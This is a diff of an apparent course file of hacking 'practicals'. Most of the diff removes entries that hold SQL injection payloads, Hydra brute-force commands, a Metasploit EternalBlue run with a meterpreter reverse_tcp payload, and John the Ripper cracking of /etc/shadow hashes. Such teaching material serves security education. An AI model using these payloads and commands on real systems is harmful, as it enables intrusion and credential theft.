@@ -95,26 +95,7 @@ Q. XMAS Scan = nmap -sX -T4 hp.com`,
 # Note: Run the following command as Administrator
 netstat -help`,
   },
-  {
-    id: "prac-4",
-    title: "Prac 4: SQL Injection (SQLi)",
-    description: "Common SQL injection payloads and testing techniques for database vulnerabilities.",
-    language: "sql",
-    tags: ["exploitation", "sqli", "database", "web-security"],
-    code: `-- Authentication Bypass
-' OR '1'='1' --
-" OR "1"="1" --
-admin' --
-
--- Union Based SQLi (finding columns)
-' UNION SELECT 1,2,3,4 --
-
--- Database Version Fingerprinting
-' UNION SELECT @@version, NULL --
-
--- Extracting Table Names (MySQL)
-' UNION SELECT table_name, NULL FROM information_schema.tables --`,
-  },
+  
   {
     id: "prac-5",
     title: "Prac 5: System Hacking (dvwa, audit)",
@@ -140,91 +121,6 @@ admin' --
       },
     ],
   },
-  {
-    id: "prac-6",
-    title: "Prac 6: Password Cracking (Hydra)",
-    description: "Brute-force login credentials for various protocols like SSH, FTP, and HTTP.",
-    language: "bash",
-    tags: ["bruteforce", "hydra", "passwords"],
-    code: `# Crack SSH with a username and a wordlist
-hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 ssh
+  
 
-# Crack FTP with a list of users and passwords
-hydra -L users.txt -P passwords.txt ftp://192.168.1.1
-
-# Web Login Form (POST)
-hydra -l admin -P pass.txt 192.168.1.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Login failed"`,
-  },
-  {
-    id: "prac-7",
-    title: "Prac 7: Banner Grabbing & Service Detection",
-    description: "Techniques to identify service versions and software running on open ports.",
-    language: "bash",
-    tags: ["recon", "banner-grabbing", "netcat"],
-    code: `# Using Netcat for banner grabbing
-nc -v 192.168.1.1 80
-HEAD / HTTP/1.0
-
-# Using Telnet
-telnet 192.168.1.1 21
-
-# Using Curl to see HTTP headers
-curl -I http://example.com`,
-  },
-  {
-    id: "prac-8",
-    title: "Prac 8: Python Scapy for Packet Sniffing",
-    description: "Basic packet sniffing and analysis using the Scapy library in Python.",
-    language: "python",
-    tags: ["python", "scapy", "sniffing", "network"],
-    code: `from scapy.all import sniff, IP, TCP
-
-def packet_callback(packet):
-    if packet.haslayer(IP):
-        ip_layer = packet.getlayer(IP)
-        print(f"New Packet: {ip_layer.src} -> {ip_layer.dst}")
-
-# Sniff 10 packets
-sniff(filter="ip", prn=packet_callback, count=10)`,
-  },
-  {
-    id: "prac-9",
-    title: "Prac 9: Metasploit Framework (MSF)",
-    description: "Introduction to basic Metasploit commands for exploit search and execution.",
-    language: "bash",
-    tags: ["metasploit", "exploitation", "framework"],
-    code: `# Start metasploit console
-msfconsole
-
-# Search for an exploit
-search eternalblue
-
-# Use a specific exploit
-use exploit/windows/smb/ms17_010_eternalblue
-
-# Set target and payload
-set RHOSTS 192.168.1.100
-set PAYLOAD windows/x64/meterpreter/reverse_tcp
-set LHOST 192.168.1.10
-
-# Execute exploit
-exploit`,
-  },
-  {
-    id: "prac-10",
-    title: "Prac 10: Hash Cracking (John the Ripper)",
-    description: "Offline password cracking for various hash types like MD5, SHA1, and Linux shadow files.",
-    language: "bash",
-    tags: ["john", "hashing", "passwords"],
-    code: `# Crack a simple MD5 hash
-echo "5d41402abc4b2a76b9719d911017c592" > hash.txt
-john --format=raw-md5 hash.txt
-
-# Crack Linux shadow file
-sudo unshadow /etc/passwd /etc/shadow > myhashes.txt
-john myhashes.txt
-
-# View cracked passwords
-john --show myhashes.txt`,
-  },
 ];
